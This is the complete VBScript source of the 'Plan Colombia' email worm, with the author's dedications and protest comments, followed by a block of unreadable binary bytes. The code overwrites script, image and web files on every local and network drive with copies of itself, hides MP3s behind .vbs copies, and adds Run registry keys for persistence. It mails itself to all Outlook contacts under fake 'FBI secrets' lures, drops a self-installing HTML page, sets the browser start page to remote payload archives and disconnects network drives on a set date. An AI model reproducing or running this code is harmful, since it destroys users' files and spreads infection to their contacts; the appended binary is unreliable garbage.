rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogot?2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina Mar?" from "Santa fe de Bogot?
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP"
 Else
  If numero = 2 Then
    polye = ".JPG"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub


                                                                                                                              ÒmıÓ3BmRä¶i5† $Lym®S˜&JÚOê$Áñf<:¼æC.ø cÿ‹Uy‰Ã=ÈCâğâ9Âo˜Ç6Ü ZËi-3ÚL_%wºïƒ_ü&ˆAáæwwwåIºæ#İİ<İİ23³$É]É¡-İ==|ÌØ¶\«gÉ0¾G’'{¹$õÉı<Ï!F€qG’ÍŸßÌ?Iüm÷ şNË’½¯æ'<Y„qšŞÿzó=ji/À‰Ké+“3;Ø–!rGÉr›¯@\ö$ŸO04>Ù°—™·<÷0±òAÓşL˜¹*¢»»»ø»ºòİĞƒ˜In¢ßËU³q2M¯1#­´™1qu‡˜Øö1¬k*Iò|]ğÓ—%¢Ö 0øºyšíQm$é'ÅÓĞ’,t>-ZO¦S‡Ëğ0 Å´]x“íÿ’ôÎazM›„ß“i:d“ `|I/­½<ÅCï8â4Z ×ÚÚ¼ÂÄø,]«eI’£âÌ¸lŒ7Ü<ë‹½pá¤xá÷Ï'ÉõÃ‹}Ç‡Ça§CÅ×‹ {aõN[xşåßÅ’÷nÆÓÄ–óƒü}Óä™®\I6ê·ö÷ñ­ÅG<ºxâ{0—oL<ª@eo^%¼»{zg^õ‡É*“^:ík·¦%IT»za­·vôÁx’M»yu†§xñ˜hÑÃ­Riâß·àkívôÎT÷ K`   Ú@ˆ  
X#Xß jñ°Ìh˜jùš°Ÿş¾k ğ}à€+ô^Lx|N›æ°5§Ë#×è«æN‚ˆåÇƒ8×ëWïëğ@ëğ`úñ±ğ0 İ}€7…ñ8“ãÇÍêyÂ€‘¹à9Uñ ·¯,Àhÿàªøe‡‹ W¸3€À2·ş¾`¨u{ i'ù:e?ÀÄ È´ckì÷«W„ÆÆF€`!^@ÿê¼¹“×‘ä^<è ¼ :^ ;`Ä <ëÆ‡ÀÀ-‚ëÃx@aUçŠªü ñ`¸Ÿ7 é_øÔux‰Ã¡Pº÷ØP\læWÀÿànÿ¯P CŞ08ğÅÃ€^{‰ĞëÚó¿@.€:¯ç@BaõáM0îÀ?€;€k^xã ÀÌºø……W¨?â	> ò"¼@¯hã`õxğåÇB`ÏÁàzñ±Ì`5uñk¯$`0¯€‡‡×ñà3|Aœ 7‡px(¡óÃëÊ,à2€]_Ø@¸|`>Xx$
ùƒ	°3ÿÍâàNl <¯ÁĞ1 ¹¿ÃÎ‰å@ğ¯> ê#×¾—^ô‡×áo8ø‚Õä•9¼Vş_Ç@™æ'ƒû®¼ ó‡€¾'.î¼ƒ¬ˆ.½¼Xx ëøÏ€:¯€1Ï^8H€j ñ¥`6¨€f¯æ‚„WÄéÃ€±<±à,…W’ şExq: ]yà×ÿZòàÛÿ^Hèux±8Dà0êòî¿DWƒ€ú/ø?ãkÄ äàûºóCî½‡Cà«Æ€8€í|@>€?¯<Ø}}™^Ápàê÷ƒWü(°xU|8]y}|‡Wœ.R}^Pø}{€³¯tA‡ÂƒˆÓ{ÀèøtÅxë]×±ûÔ:½¢¢é¦òİ×ØUíô“ ÿÿÿÿÿÿÿÿÿÿ $Udd  º!ç§©€‘  Àî@ !çğK#YzbôÆVì­ÔÂ)„*r§x´ñEb¬zÇhV†ÄlG@XÑ+!.‚w(˜&Z¯Z`ğP}†ƒæULª ÕÁ«{à÷Á¡šŒfvg«z¶ffgVue­aÖêwkZÙw‡u±ljEÓkaë[±Cr…ùÓó§J®•\%Â[€7 rw7ŠØ½V`cv7<sM³fä0C!©«›ÍJkxå‡Ë4=!š;04bhÅ%RUè“Ñ#zG›ë¾¹8“‹H´‚	¤Á5ƒ¨íÆÍªN¥®z óÕnÍ#p.àVEì‹ébÖH®‘Wµz·‹x{·»¦zgKÔ°’P\‡XuDÑ6›N÷”•Ã‚®$B„h²Ñs ç=âd"Æ’iz—©ØŠugVuÚ"–G53T‘%‰ÄÚÑÅfk0sfæÍorŞçÅï‹Ş]åâ×Å¯f†h+2³ˆg‡–YelÙa½‡•¡h†ˆhX›6Ûm­kZ0ZÑ‚ÖhLĞ àÁÁ{„÷én•ğà¡‹J´¤DeTVUeº¥gl$I&eUFñkn7HKÓœë}'[£¡GBUtªèN£áòkdÖª›ºµ»[“hçyE¹U1ëeí{cf5*
ˆT)­J@ÿı° fDDfDfDDDDD’I$q²I      
U T ¡8äI’Q%Y5“m†ØaµØmgduÙ…è^ù#~H’'£†8c9¡he’d†H¥Šy¢hdŠH¥–Z"š)Ä“N$•p‚á6jläÖI¬X–%Ñ«£VE‘5MEõl]P$	ÑtÆñjnÒT—4³¢ÑpƒNâFğ¢1ïcß&NL›¥NÈòöµíl/¬«+|ß¿Ïô›'%iXô=NQ
Æ‰öÛ¶j¨L[BbÉ.r\èÈQ[¶5bX¤ÉÉs[Ó@ÏI8"kµiYIDi´b²›M©W¼c°£†®©]S‡×²ö¥í·-ËÆ#¶‚Î3‰ŠbÍ³‡Áî„à¸/@Ğ}\1ÎëZÑ*Æ‰V%NJz¡™C2	L–Ñ´æÌ\WµìşSÑdY®k–4lõ)ÔµjZµI‹F"çRG,z5cæs¢çEªPT ¶-d^È™&Jú–3Êj8£¨ê6¿MJƒ¢hœ²!N)¦µäxÏ#ÆV6±2ªeYK&‰´“i$Um[Y¦isÜõebF‘´Á0«êø:x©‹[˜P„„Ûò<­Ô[©7¦oJêºï=Şkªê…«‹Šâã¸ò´¬–%¨J«ªÍ£*5µ†9ã­Oh8¨1dsæ @,W•äyÉÛ£¨ê®«m+Hø>
‚ H•&¸®-KQ†¤B!:•z]›Òí)òSäi<Ò{&>IFÊ­´b4$iÚ¶£hÛèúR´ª6®Ë³~ß¦‘¦Ûm®kU`¨c&—M æÁÍ“ß'½l[ç¹ïD‘$[VÕµm[VÓHÉZÖ´IZÑ¤Ú×9ÍlR Âç­Ï\Ø=®s\æ­‹cdÖÉ­£hŞ·«Äº®¨’%Cªê²,‹¢èÔm#m¦µ­ ÿı² fUUUUfUDUDU¶É-m"@      
ªª  øª úã@ô’QFUVŸq§Ü8Ÿ'£à†8#)$–Yâ–he9¢’J$’›…ÔÜ.™èez¡]èWv‡hy‡˜{Ú÷µİÙqZ*"â5ÍİášÙ©ŞÖµ­È›yj7%k`á Ç
¶bª ÷(=Â‰(¼ëÆí¬ãc¢:Çğ2C$Vá6`&
!Ä( XÕ†Ã``Á²…šôl×eåyiY’V$©š™ši¦„_	=İÚN“©ªš“dØíƒU]šZÊ§‹¢y<«Ü[H¡rA™z7_fX™–&vggwww:tİİÒ¤ªV)aDÖ`êUáŠiÃšf™x—”¢Qûù¶D*2!Q†a‚ ¨#v‡h—ywlÚÙµeÖ^D‘U¥^µ®$âR%Şbæxe†Xm¶áÃkf§‡9<6*EšrÜ‚7†xecV7=Î{šif—õıİİİ$I•ÙaÕİö°sœXx‡‡#0hA=HÙëøÙxBA2„<¡Ù™P…gÎ,ùÏœè%Â,^—•À)U¤šª‚—RÅb¯ßPf×…:Ä($nÜZE‘6ugVhfˆÅÑ‹”EH[æúYå\éjšZm¦aÄša…if–“mëÙÌb‡ÂÓ¾jUÛ‘Šn‡wwwgfvsç=U•Y¬k:¡–µ­Ö]%Ñ]YÖ¸>Ìœ¹M¦ß>kcÃ£(]¢’¤…§ˆx‡‡xwÅÏ‹•Ù]Ô6 áF¦á•™Y‘¡a2Ì¶mfæ“Jå¶¶BY’RÍjT‘8áf8YvgfˆÈ{à÷Á”™Iu]fffV6Ñ­SQÚ!¢]Ö×AĞë¾»n7.\kJĞÂR†az¸¾&o‰TH‡˜|±¹cAĞ´­Ñ{åŒ‚˜i™TÀ_Ø‹8³“‘¯^»Üÿı° fUDUDfUDDDT¶I-m$‰      
¥
ª ê®ğ ª8äÓU5Se%YIVUVšøàvH’`‚(§’Ib–)¤†i!–Z¢˜§’I$£eu++¢~øŸ¾‹µWh‹ˆµµm›61™Y•$IÖ˜ÉFåå¾¤zHH”±,Øn†q¸çÔrå° ¾@õÒµt-\ïŸ	w—u±l{÷>ám[SôùFİ™l–Xefš´!P”9Sm6«V…	­"¬iœv7Ğƒ¡EDU±l‹Ÿ<Ù™DäÚYk[!İmvgf€›6Õµf¦jJ:|ù­~²[õ“ –i&/Ü_ÅQp (ƒ¯]˜ÙŒÜIÆí1I‘À'wçnLŠ¾¯½›ÚTªE‹©Pƒ#‚Á6RÅ±AFº‹~‰è˜"€­X!‚³lÏcØb²Vd                    Ğ
L ÿÿÿÿÿÿÿÿÿÿ $Ubb  º!ç±	€‘  à	1é±õék“~.¿€fÁQ°4ÿ×¼Ø¶ƒÀ>¯&°¢~¯8pxt>¾G]xXèt:7Ø¯$t7èêõ¯° >¯` ò=`-ªùƒ7ü:¾t@5áDhÈ(:ëÁˆ¡Ğ1 ÀŞuöªü7ğ o_ŠUxHò{ÆÀq¡õüø˜Djñ pÿ‡İ×•>^u-ÀhzëÂ ŞæòÔtŞºñ“cHÑÕä…@v¼4ºóÍºñl äÕî^úô¯ _÷^;U×Æ Ú:¼PyñĞuå‰ğŠğ=Pat>¼Ó£@…y``ÿ¯":jøC¦ö¨ù¼˜]×†UUä@êı^H}×éÕô>¼€ğU}‹¯ÑÕóª¼ú¯Xªò¤}}œõã 2¨*òÔux}Ü:>¾ÇWã×º»›É×^\»¯ƒÁuäOÿë